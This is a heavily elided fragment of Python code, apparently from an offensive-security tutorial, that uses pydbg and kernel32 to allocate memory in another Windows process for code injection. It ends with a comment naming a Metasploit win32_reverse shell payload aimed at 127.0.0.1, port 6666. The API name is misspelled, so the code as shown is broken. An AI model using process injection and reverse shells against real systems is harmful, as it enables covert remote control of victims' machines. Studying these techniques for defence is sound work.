...
from pydbg.defines import VIRTUAL_MEM
...
def inject(pid,data,parameter = 0):
    ...
    arg_address = kernel32.VituralAllocEx(h_process,0,len(data),VIRTUAL_MEM,PAGE_READWRITE)
    written = c_int(0)
...
#/* win32_reverse -  EXITFUNC=thread LHOST=127.0.0.1 LPORT=6666 Size=287 Encoder=None http://metasploit.com */
